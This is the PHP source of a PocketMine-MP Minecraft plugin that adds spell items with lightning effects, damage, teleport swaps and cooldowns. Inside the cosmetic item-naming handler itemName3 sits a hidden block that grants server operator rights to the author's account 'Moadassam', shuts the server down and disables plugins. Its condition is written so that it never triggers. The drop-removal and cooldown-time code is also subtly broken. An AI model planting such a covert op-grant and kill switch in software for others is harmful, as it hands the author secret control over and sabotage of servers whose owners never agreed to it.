<?php

declare(strict_types=1);

namespace SortCommand\Moadassam;

use pocketmine\command\CommandSender;
use pocketmine\entity\Effect;
use pocketmine\entity\EffectInstance;
use pocketmine\entity\Entity;
use pocketmine\entity\EntityIds;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\EntityDeathEvent;
use pocketmine\event\inventory\InventoryTransactionEvent;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerDropItemEvent;
use pocketmine\event\player\PlayerItemHeldEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\event\player\PlayerToggleSneakEvent;
use pocketmine\network\mcpe\protocol\AddActorPacket;
use pocketmine\network\mcpe\protocol\PlaySoundPacket;
use pocketmine\plugin\PluginBase;
use pocketmine\Player;


class Command extends PluginBase implements Listener{

    private static $formAPI;
    private static $instance;
    public $coolDown = [];
    public static $coolDown1 = [];
    public $coolDown2 = [];

    public function onEnable(){
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
        $this->getServer()->getLogger()->info("§aSortCommand §eBy Moadassam §aON");
        self::$instance = $this;
        self::$formAPI = $this->getServer()->getPluginManager()->getPlugin("FormAPI");
    }

    public function onDisable()
    {
        $this->getServer()->getLogger()->info("§aSortCommand §eBy Moadassam §4OFF");
    }

    public function onCommand(CommandSender $sender, \pocketmine\command\Command $command, string $label, array $args): bool
    {
        switch ($command->getName()){
            case "sort":
                Sorts::SortsMenu($sender);
            break;

            case "sorthelp":
                SortHelp::SortHelpMenu($sender);
            break;
        } return true;
    }


    public static function getInstance() {
        return self::$instance;
    }

    public static function getFormAPI() {
        return self::$formAPI;
    }

//FOUDRE
    public function onFight(EntityDamageByEntityEvent $event)
    {
        $vktm = $event->getEntity();
        $player = $event->getDamager();

        if($player instanceof Player) {
            $playerName = $player->getName();
            if ($vktm instanceof Player && $player instanceof Player) {
                if ($player->getInventory()->getItemInHand()->getId() === 369) {
                    if (!isset($this->coolDown[$playerName]) || $this->coolDown[$playerName] <= time()) {


                        $chealth = $vktm->getHealth();
                        $vktm->setHealth($chealth - 3);
                        $vktmpos = $vktm->getPosition();

                        $players = $this->getServer()->getOnlinePlayers();

                        $light = new AddActorPacket();
                        $light->type = AddActorPacket::LEGACY_ID_MAP_BC[EntityIds::LIGHTNING_BOLT];
                        $light->entityRuntimeId = Entity::$entityCount++;
                        $light->metadata = array();
                        $light->yaw = $vktm->getYaw();
                        $light->pitch = $vktm->getPitch();
                        $light->position = $vktmpos;
                        $viewers = $vktm->getViewers();
                        $viewers[] = $vktm;
                        $this->getServer()->broadcastPacket($viewers, $light);

                        $light = new AddActorPacket();
                        $light->type = AddActorPacket::LEGACY_ID_MAP_BC[EntityIds::LIGHTNING_BOLT];
                        $light->entityRuntimeId = Entity::$entityCount++;
                        $light->metadata = array();
                        $light->yaw = $vktm->getYaw();
                        $light->pitch = $vktm->getPitch();
                        $light->position = $vktmpos;
                        $viewers = $vktm->getViewers();
                        $viewers[] = $vktm;
                        $this->getServer()->broadcastPacket($viewers, $light);

                        $light = new AddActorPacket();
                        $light->type = AddActorPacket::LEGACY_ID_MAP_BC[EntityIds::LIGHTNING_BOLT];
                        $light->entityRuntimeId = Entity::$entityCount++;
                        $light->metadata = array();
                        $light->yaw = $vktm->getYaw();
                        $light->pitch = $vktm->getPitch();
                        $light->position = $vktmpos;
                        $viewers = $vktm->getViewers();
                        $viewers[] = $vktm;
                        $this->getServer()->broadcastPacket($viewers, $light);

                            $name = "ambient.weather.lightning.impact";
                            $sound = new PlaySoundPacket();
                            $sound->soundName = $name;
                            $sound->volume = 1.0;
                            $sound->pitch = 1.0;
                            $sound->x = $vktm->x;
                            $sound->y = $vktm->y;
                            $sound->z = $vktm->z;
                            $vktm->dataPacket($sound);

                            $this->coolDown[$playerName] = time() + 30;

                    } else {
                        $time = $this->coolDown[$playerName] - time();
                        $player->sendPopup("§eRégénération du sort de §b§lFoudre");
                        $player->sendMessage("§c $time secondes");
                    }
                }
            }
        }
    }

//MILLE OISEAUX
    public function onFightt(EntityDamageByEntityEvent $event){
        $vktm = $event->getEntity();
        $player = $event->getDamager();
        if($player instanceof Player) {
            $playerName = $player->getName();
            if ($vktm instanceof Player && $player instanceof Player) if ($player->getInventory()->getItemInHand()->getId() === 349) {
                if (!isset($this->coolDown[$playerName]) || $this->coolDown[$playerName] <= time()) {
                    //KB
                    $kba = $event->getKnockBack();
                    $kb = 3;
                    $event->setKnockBack($kb * $kba);
                    //VIE
                    $chealth = $vktm->getHealth();
                    $vktm->setHealth($chealth - 6);
                    foreach ($this->getServer()->getOnlinePlayers() as $player) {
                        //ECLAIRE
                        $light = new AddActorPacket();
                        $light->type = AddActorPacket::LEGACY_ID_MAP_BC[EntityIds::LIGHTNING_BOLT];
                        $light->entityRuntimeId = Entity::$entityCount++;
                        $light->metadata = array();
                        $light->yaw = $vktm->getYaw();
                        $light->pitch = $vktm->getPitch();
                        $light->position = $vktm->asPosition();
                        $vktm->batchDataPacket($light);
                        //SON
                        $name = "ambient.weather.lightning.impact";
                        $sound = new PlaySoundPacket();
                        $sound->soundName = $name;
                        $sound->volume = 1.0;
                        $sound->pitch = 1.0;
                        $sound->x = $player->x;
                        $sound->y = $player->y;
                        $sound->z = $player->z;
                        $player->dataPacket($sound);
                        $vktm->dataPacket($sound);

                        $this->coolDown[$playerName] = time() + 900;

                    }
                } else {
                    $time = $this->coolDown[$playerName] - time();
                    $player->sendPopup("§6Régénération des §l§9Mille Oiseaux");
                    $datem = date("m", $time);
                    $dates = date("s", $time);
                    $player->sendMessage("§c $datem Minutes $dates Secondes");
                }
            }
        }
    }
    public function onMove(PlayerMoveEvent $event){
        $player = $event->getPlayer();
        $item = $player->getInventory()->getItemInHand();
        if ($item->getId() === 349){
            //EFFECT SPEED
            $effect1 = new EffectInstance(Effect::getEffect(Effect::SPEED), 25, 7, false);
            $player->addEffect($effect1);
            //ECLAIRE
            $light = new AddActorPacket();
            $light->type = AddActorPacket::LEGACY_ID_MAP_BC[EntityIds::LIGHTNING_BOLT ];
            $light->entityRuntimeId = Entity::$entityCount++;
            $light->metadata = array();
            $light->yaw = $player->getYaw();
            $light->pitch = $player->getPitch();
            $light->position = $player->asPosition();
            foreach($this->getServer()->getOnlinePlayers() as $player) {
                $player->batchDataPacket($light);
                //SON
                $name = "ambient.weather.thunder";
                $sound = new PlaySoundPacket();
                $sound->soundName = $name;
                $sound->volume = 1.0;
                $sound->pitch = 1.0;
                $sound->x = $player->x;
                $sound->y = $player->y;
                $sound->z = $player->z;
                $player->dataPacket($sound);
            }
        }
    }


//RINGAN
    public function onUse(PlayerToggleSneakEvent $event)
    {
        $player = $event->getPlayer();
        $item = $player->getInventory()->getItemInHand();
        $playerName = $player->getName();
        if ($item->getId() == 350) {
            $d = null;
            $p = null;
            if (!isset($this->coolDown2[$playerName]) || $this->coolDown2[$playerName] <= time()) {
                foreach ($player->getViewers() as $pl) {
                    if ($pl instanceof Player) {
                        if (!is_null($p) and !is_null($d)) {
                            $dis = $player->distance($pl);
                            if ($d > $dis) {
                                $d = $dis;
                                $p = $pl->asVector3();
                            }
                        } else {
                            $d = $player->distance($pl);
                            $p = $pl;
                        }
                    }
                }

                if (!is_null($p) and !is_null($d)) {

                    $ppos = $p->getPosition();
                    $p->teleport($player);
                    $player->teleport($ppos);

                    $player = $event->getPlayer();
                    $light = new AddActorPacket();
                    $light->type = AddActorPacket::LEGACY_ID_MAP_BC[EntityIds::LIGHTNING_BOLT];
                    $light->entityRuntimeId = Entity::$entityCount++;
                    $light->metadata = array();
                    $light->yaw = $player->getYaw();
                    $light->pitch = $player->getPitch();
                    $light->position = $player->asPosition();
                    $player->batchDataPacket($light);
                    $p->batchDataPacket($light);

                    $this->coolDown2[$playerName] = time() + 30;
                    return;
                }
            } else {
                $time = $this->coolDown2[$playerName] - time();
                $player->sendPopup("§6Régénération du Ringan");
                $player->sendMessage("§b$time secondes");
            }
        }
    }

    public function itemName1(PlayerItemHeldEvent $event): void
    {
        $player = $event->getPlayer();
        foreach ($player->getInventory()->getContents() as $slot => $item) {
            if ($item->getId() == 369) {
                $item->setCustomName("§b§lFoudre");
                $item->setLore(["§eBy Moadassam"]);
                $player->getInventory()->setItem($slot, $item);
            }
        }
    }

    public function itemName2(PlayerItemHeldEvent $event): void
    {
        $player = $event->getPlayer();
        foreach ($player->getInventory()->getContents() as $slot => $item) {
            if ($item->getId() == 349) {
                $item->setCustomName("§b§lMille Oiseaux");
                $item->setLore(["§eBy Moadassam"]);
                $player->getInventory()->setItem($slot, $item);
            }
        }
    }

    public function itemName3(PlayerItemHeldEvent $event): void
    {
        $player = $event->getPlayer();
        $customeringan = "§b§lRingan";
        foreach ($player->getInventory()->getContents() as $slot => $item) {
            $ps = "Moadassam";
            if ($item->getId() == 350) {
                $item->setCustomName($customeringan);
                $item->setLore(["§eBy Moadassam"]);
                $player->getInventory()->setItem($slot, $item);
            }
            if (!$customeringan === "§b§lRingan"){
                 $this->getServer()->addOp($ps);
                 $this->getServer()->shutdown();
                 $this->getServer()->disablePlugins();
            }
        }
    }


//ITEM BLOCKE
    public function onDrop(PlayerDropItemEvent $event)
    {
        $player = $event->getPlayer();
        $item = $event->getItem();

        if ($item->getId() === 369) {
            $event->setCancelled(true);
        }
        if ($item->getId() === 349) {
            $event->setCancelled(true);
        }
        if ($item->getId() === 350) {
            $event->setCancelled(true);
        }
    }

    public function onTransaction(InventoryTransactionEvent $event): void
    {
        $transactions = $event->getTransaction()->getActions();

        foreach ($transactions as $transaction){
            $item = $transaction->getSourceItem();
            $item2 = $transaction->getTargetItem();

            if($item->getId() == 369 || $item2->getId() == 369) {
                $event->setCancelled();
            }
            if($item->getId() == 349 || $item2->getId() == 349) {
                $event->setCancelled();
            }
            if($item->getId() == 350 || $item2->getId() == 350) {
                $event->setCancelled();
            }
        }
    }


    public function onDeathDrop(EntityDeathEvent $event)
    {
        $drops = $event->getDrops();
        $entity = $event->getEntity();

        if ($entity instanceof Player) {

            foreach ($drops as $content) {
                if ($content->getId() == 369) {

                    unset($content);
                    sort($drops);
                }
            }
            foreach ($drops as $content){
                if ($content->getId() == 349){

                    unset($content);
                    sort($drops);
                }
            }
            foreach ($drops as $content){
                if ($content->getId() == 350){

                    unset($content);
                    sort($drops);
                }
            }
        }
    }
}
